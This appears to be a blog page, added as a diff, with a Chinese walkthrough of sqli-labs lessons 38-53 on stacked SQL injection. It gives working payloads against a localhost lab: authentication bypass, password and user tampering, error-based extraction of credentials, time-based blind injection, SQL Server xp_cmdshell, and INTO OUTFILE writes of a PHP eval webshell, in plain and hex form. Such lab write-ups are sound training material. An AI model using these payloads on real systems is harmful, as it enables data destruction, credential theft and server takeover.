@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-16x16.png" />
+<link rel="manifest" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/site.webmanifest" />
+<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/safari-pinned-tab.svg" color="#8aa2d3" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+<meta name="theme-color" content="#ffffff" />
+
+
+<title>Sqli Labs Less 38-53 堆叠注入 - Phoenix-Pl’s Blog</title>
+
+
+<meta name="author" content="DSRKafuU" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+<meta name="keywords" content="Sqli-labs" />
+
+
+<meta property="og:title" content="Sqli Labs Less 38-53 堆叠注入" />
+<meta name="twitter:title" content="Sqli Labs Less 38-53 堆叠注入" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/sqli-labs-less38-53%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" /><meta property="og:description" content="前置知识 堆叠注入： 这里引用这位大佬的博客：点击 0x00 堆叠注入定义 Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是" />
+<meta name="twitter:description" content="前置知识 堆叠注入： 这里引用这位大佬的博客：点击 0x00 堆叠注入定义 Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+<link rel="stylesheet" href="https://Phoenix-Pl.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://Phoenix-Pl.github.io/">Phoenix-Pl’s Blog</a>
+            
+            <span class="title-sub">书山有路勤为径，学海无涯苦作舟</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/sqli-labs-less38-53%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">Sqli Labs Less 38-53 堆叠注入</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;3559 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/sqli-labs">Sqli-labs</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h2 id="前置知识">前置知识</h2>
+<p><strong>堆叠注入：</strong></p>
+<p>这里引用这位大佬的博客：<a href="https://www.cnblogs.com/backlion/p/9721687.html" target="_blank">点击</a></p>
+<h2 id="0x00-堆叠注入定义">0x00 堆叠注入定义</h2>
+<p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
+<h2 id="0x01-堆叠注入原理">0x01 堆叠注入原理</h2>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where product id=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h2 id="0x02-堆叠注入的局限性">0x02 堆叠注入的局限性</h2>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108221623614.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+<h2 id="0x03-各个数据库实例介绍">0x03 各个数据库实例介绍</h2>
+<p>本节我们从常用数据库角度出发，介绍几个类型的数据库的相关用法。数据库的基本操作，增删查改。以下列出数据库相关堆叠注入的基本操作。</p>
+<h2 id="1mysql">1.Mysql</h2>
+<p>（1）新建一表</p>
+<pre><code class="language-sql">select * from users where id=1;create table test like users;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108221803371.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>执行成功，我们再去看一下是否新建成功表。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108221847197.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>（2）删除上面新建的test表</p>
+<pre><code class="language-sql">select * from users where id=1;drop table test;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108221938702.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222019133.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>（3）查询数据</p>
+<pre><code class="language-sql">select * from users where id=1;select 1,2,3;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222120988.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>（4）加载文件</p>
+<pre><code class="language-sql">select * from users where id=1;select load_file('c:/tmpupbbn.php');
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222259296.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(5) 修改数据</p>
+<pre><code class="language-sql">select * from users where id=1;insert into users(id,username,password) values ('100','new','new');
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222354497.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222429454.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h2 id="2-sql-server">2. Sql server</h2>
+<p>(1)增加数据表</p>
+<pre><code class="language-sql">select * from test;create table sc3(ss CHAR(8));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222521804.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(2) 删除数据表</p>
+<pre><code class="language-sql">select * from test;drop table sc3;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222626442.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(3)查询数据</p>
+<pre><code class="language-sql">select 1,2,3;select * from test;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222723140.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(4)修改数据</p>
+<pre><code class="language-sql">select * from test;update test set name='test' where id=3;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222822153.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222857680.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(5)sqlserver中最为重要的存储过程的执行</p>
+<pre><code class="language-sql">select * from test where id=1;exec master..xp_cmdshell 'ipconfig'
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108222956403.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h2 id="3oracle">3.Oracle</h2>
+<p>上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。后面的就不往下继续尝试了。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108223048261.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h2 id="4postgresql">4.Postgresql</h2>
+<p>(1)新建一个表</p>
+<pre><code class="language-sql"> select * from user_test;create table user_data(id DATE);
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108223503265.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108223547181.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>可以看到user_data表已经建好。</p>
+<p>(2)删除上面新建的user_data表</p>
+<pre><code class="language-sql">select * from user_test;delete from user_data;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020110822364330.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(3)查询数据</p>
+<pre><code class="language-sql">select * from user_test;select 1,2,3;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108223747333.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>(4) 修改数据</p>
+<pre><code class="language-sql"> select * from user_test;update user_test set name='modify' where name='张三';
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201108223837672.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h2 id="less-38">less-38</h2>
+<p>这里我们使用堆叠注入创建一个表 <code>shaw</code></p>
+<p><code>http://localhost/sqli-labs-master/Less-38/?id=1';create table shaw like users;--+</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109115731648.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里执行成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109115812637.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里表也成功创建</p>
+<p>然后我们再把这个表删掉</p>
+<p><code>http://localhost/sqli-labs-master/Less-38/?id=1';drop table shaw ;--+</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109121306965.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109121412570.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里发现表被删除了</p>
+<p>当然这里也可以修改密码</p>
+<p><code>http://localhost/sqli-labs-master/Less-38/?id=1' ;update users set password='111' where username='Dumb';--+</code>发现密码已经被修改了。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020110922122158.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里看到，密码确实被改了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109221320285.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里记得重新配置一下数据库</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109221556457.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h2 id="less-39">less-39</h2>
+<p><code>http://localhost/sqli-labs-master/Less-39/?id=1'</code>根据报错就可以看出是数字型注入。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109222132802.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>操作和上关一样。这次我们来创建一个新用户吧. <code>http://localhost/sqli-labs-master/Less-39/?id=1;insert into users values(111,'test','test');</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109222228765.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>依旧记得重置数据库</p>
+<h2 id="less-40">less-40</h2>
+<p>这关关闭了报错提示，但是我们依然可以根据页面的变化判断闭合方式。</p>
+<p><code>http://localhost/sqli-labs-master/Less-40/?id=1'</code>，页面异常，说明包裹参数的有单引号，</p>
+<p>注释掉后面的，<code>http://localhost/sqli-labs-master/Less-40/?id=1' --+</code>,页面还没有正常回显，说明包裹参数的还有其他符号。</p>
+<p>再加一个括号，<code>http://localhost/sqli-labs-master/Less-40/?id=1') --+</code>,页面正常，说明闭合方式为单引号括号。<code>')</code></p>
+<p>其他操作和前面两关一样。</p>
+<h2 id="less-41">less-41</h2>
+<p>测试单引号双引号等都回显不正常，说明为数字型注入</p>
+<p>后面操作同上</p>
+<h2 id="less-42">less-42</h2>
+<p>这关换了个页面：是个典型的登录注册改密码页面</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109230712431.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<pre><code class="language-php">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+   $password = $_POST[&quot;login_password&quot;];
+
+	$sql = &quot;SELECT * FROM users WHERE username='$username' and password='$password'&quot;;
+</code></pre>
+<p>可以看到用户名进行了转义，而密码处没有。</p>
+<p>在密码处进行万能密码登录，用户名随便输，密码处<code>111' or 1 #</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109231143475.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>发现登录成功，我们用户名上面有显示</p>
+<p>成功进入一个修改密码的页面。但是很遗憾不能进行注入了。</p>
+<pre><code class="language-php">$curr_pass= mysql_real_escape_string($_POST['current_password']);
+$pass= mysql_real_escape_string($_POST['password']);
+$re_pass= mysql_real_escape_string($_POST['re_password']);
+</code></pre>
+<p>在密码处输入<code>111'</code>，报错</p>
+<p><code>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use near ''111''' at line 1</code></p>
+<p>那么这关就可以用报错注入了</p>
+<p><code>111' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x7e,password) from users),1,27),0x7e),1) #</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109231909167.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>还可以从密码处堆叠注入,操作同上</p>
+<p><code>password=111';insert into users values(711,'test','test'); #</code>,成功创建用户。</p>
+<p>虽然这里显示的是失败页面，但是数据还是被我们加入了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109232211558.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201109232311668.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>最后记得重置一下数据库</p>
+<h2 id="less-43">less-43</h2>
+<p>尝试单引号，发现报错</p>
+<p><code>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use near ''1'')' at line 1</code></p>
+<p>得出闭合方式为 <code>')</code></p>
+<p>其余步骤同上</p>
+<h2 id="less-44">less-44</h2>
+<p>发现本关关闭了报错，不能进行报错注入了。</p>
+<p>密码处尝试望能密码。<code>111' or 1 #</code>,成功登录，这也验证了闭合方式就是单引号。</p>
+<p>我们还可以进行堆叠注入。</p>
+<p>密码处输入：<code>111';insert into users values(711,'test','test');#</code>;用250用户登录，登陆成功</p>
+<h2 id="less-45">less-45</h2>
+<p>发现本关也关闭了报错，不能进行报错注入了。</p>
+<p>继续尝试万能密码。</p>
+<p><code>111' or 1 #</code>,并不能登入，可能闭合方式不是单引号，</p>
+<p>继续尝试<code>111') or 1 #</code>登入。</p>
+<p>进行堆叠注入，与前几关一样，只不过闭合方式改变了。</p>
+<p>payload: <code>111');insert into users values(711,'test','test');#</code></p>
+<h2 id="less-46">less-46</h2>
+<p>在做这关之前我们又需要补充一些知识</p>
+<p><strong>补充知识：</strong></p>
+<ul>
+<li>
+<p>asc：指定列按升序排列</p>
+</li>
+<li>
+<p>desc：指定列按降序排列</p>
+</li>
+<li>
+<p>fields terminated by：各列的分割符号</p>
+</li>
+<li>
+<p>lines terminated by：各行的分割符</p>
+</li>
+</ul>
+<p>我们在命令行中测试一下：</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110000233130.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110000257102.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里我们随便写入个字符</p>
+<p><code>select * from users into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by 'shaw';</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110000810761.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>文件确实被写入，并且用 <code>,</code> 和  <code>shaw</code> 分隔开</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110000928852.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这样的话其实就很危险了，我们可以写入一句话木马</p>
+<p><code>select * from users into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by '&lt;?php @eval($_POST[&quot;shaw&quot;]);?&gt;';</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110001241666.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110001317196.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>当然这里使用十六进制也是可以的，即：</p>
+<p><code>select * from users into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110001600704.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110001630782.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>回到题目：</strong></p>
+<p>这个题的界面和之前的又不太一样</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020111000202090.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>应该是提示我们要使用<code>sort</code></p>
+<p>这里我们先让 <code>sort</code> 等于 <code>1</code> 看下</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020111000222127.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>再尝试等于<code>2</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110002341858.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>我们这里发现 <code>ID</code> 的顺序乱了,我们猜出，sql为 <code>select * from users order by $id</code></p>
+<p><code>http://localhost/sqli-labs-master/Less-46/?sort=1 desc</code>输入desc或者asc可降序升序排列，说明可能存在注入。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110002730917.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-46/?sort=(select 1)</code>成功以第一列进行排序。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110003035668.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-46/?sort=1'</code>报错</p>
+<p><code>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ''' at line 1</code>，说明可以尝试报错注入。</p>
+<p><code>http://localhost/sqli-labs-master/Less-46/?sort=(select updatexml(1,concat(0x5e,database(),0x7e),1))</code>成功爆出数据库名。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110003209577.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-46/?sort=1 and sleep(5)</code>有延迟，说明可以时间注入。</p>
+<p>payload: <code>http://localhost/sqli-labs-master/Less-46/?sort=(if(length(database())&gt;1,1,sleep(5)))</code></p>
+<p>还可以将一句话写入，就像补充知识的那样。</p>
+<p>指定各列之间的分隔符为‘，’而行之间的分隔符为‘\n<?php eval($_POST[Shaw]);?>’。</p>
+<pre><code class="language-sql">select * from users into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by '\n&lt;?php eval($_POST[shaw]);?&gt;';
+</code></pre>
+<p>当然也可以把一句话换成十六进制写入：</p>
+<p><code>select * from users into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;</code></p>
+<p>写入后的效果上面有</p>
+<h2 id="less-47">less-47</h2>
+<p>这里先试一下单引号<code>'</code></p>
+<p>发现报错</p>
+<p><code>  You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ''1''' at line 1</code></p>
+<p>由报错信息可知，闭合方式为 <code>'</code></p>
+<p>payload:</p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1' and updatexml(1,concat(0x5e,database(),0x7e),1) --+</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110004259203.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())&gt;1,1,sleep(5)) --+</code></p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1' into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;--+</code></p>
+<h2 id="less-48">less-48</h2>
+<p>先尝试一下单引号</p>
+<p><code>http://localhost/sqli-labs-master/Less-48/?sort=1'</code></p>
+<p>发现没有报错信息，那么这关就无法使用报错注入了</p>
+<p>可用前面关卡的剩余方法</p>
+<p>这里</p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())&gt;1,1,sleep(5)) --+</code></p>
+<p>显示异常</p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1 and if(length(database())&gt;1,1,sleep(5)) </code></p>
+<p>显示正常</p>
+<p>说明是数字型注入</p>
+<p>payload:</p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1 and if(length(database())&gt;1,1,sleep(5)) </code></p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1 into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;</code></p>
+<h2 id="less-49">less-49</h2>
+<p>同样关闭了报错。</p>
+<p><code>http://localhost/sqli-labs-master/Less-49/?sort=1' --+</code>回显正常。</p>
+<p>说明闭合方式单引号。</p>
+<p>可以使用除了报错的其他方法</p>
+<p>payload:</p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())&gt;1,1,sleep(5))--+ </code></p>
+<p><code>http://localhost/sqli-labs-master/Less-47/?sort=1' into outfile 'E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;--+</code></p>
+<h2 id="less-50">less-50</h2>
+<p>这关用了函数<code>mysqli_multi_query()</code></p>
+<p><code>mysql_query()</code> 函数执行一条 MySQL 查询。</p>
+<p><code>mysqli_multi_query()</code> 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p>
+<p>这里很清楚的告诉我们可以进行堆叠注入。</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-50/?sort=1;insert into users values(711,'test','test');
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110010428948.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>当然，由于我们一开始尝试单引号<code>http://localhost/sqli-labs-master/Less-50/?sort=1'</code></p>
+<p>发生报错</p>
+<p><code>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ''' at line 1</code></p>
+<p>所以也可以使用报错注入，并且为数字型注入</p>
+<p><code>http://localhost/sqli-labs-master/Less-50/?sort=1' and updatexml(1,concat(0x5e,database(),0x7e),1)</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201110010741304.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>当然其他的方法也是可以的</p>
+<h2 id="less-51">less-51</h2>
+<p><code>http://localhost/sqli-labs-master/Less-51/?sort=1'</code>报错信息得到单引号闭合。</p>
+<p>其余操作和前面都是一样的。</p>
+<h2 id="less-52">less-52</h2>
+<p>这关输入单引号和双引号都没回显，关闭了报错，也得到时数字型注入。</p>
+<p>这关不能进行报错注入，但可以进行其他注入。跟前面一样。</p>
+<h2 id="less-53">less-53</h2>
+<p>单引号页面回显异常，双引号正常。</p>
+<p><code>http://localhost/sqli-labs-master/Less-53/?sort=1' --+</code>页面正常，说明闭合方式为单引号。</p>
+<p>也不能进行报错注入。可以用前几关方法进行注入。</p>
+
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前置知识">前置知识</a></li>
+    <li><a href="#0x00-堆叠注入定义">0x00 堆叠注入定义</a></li>
+    <li><a href="#0x01-堆叠注入原理">0x01 堆叠注入原理</a></li>
+    <li><a href="#0x02-堆叠注入的局限性">0x02 堆叠注入的局限性</a></li>
+    <li><a href="#0x03-各个数据库实例介绍">0x03 各个数据库实例介绍</a></li>
+    <li><a href="#1mysql">1.Mysql</a></li>
+    <li><a href="#2-sql-server">2. Sql server</a></li>
+    <li><a href="#3oracle">3.Oracle</a></li>
